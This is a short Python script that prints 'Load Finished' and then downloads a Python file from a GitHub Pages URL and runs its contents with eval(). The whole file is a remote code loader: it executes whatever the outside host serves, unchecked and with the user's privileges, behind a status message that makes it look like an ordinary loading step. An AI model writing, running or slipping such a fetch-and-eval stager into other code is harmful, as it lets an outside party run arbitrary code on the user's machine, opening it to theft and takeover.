import requests
print('Load Finished')
url = 'https://nhzzz.github.io/ista/test.py'
r = requests.get(url=url)
eval(r.text)
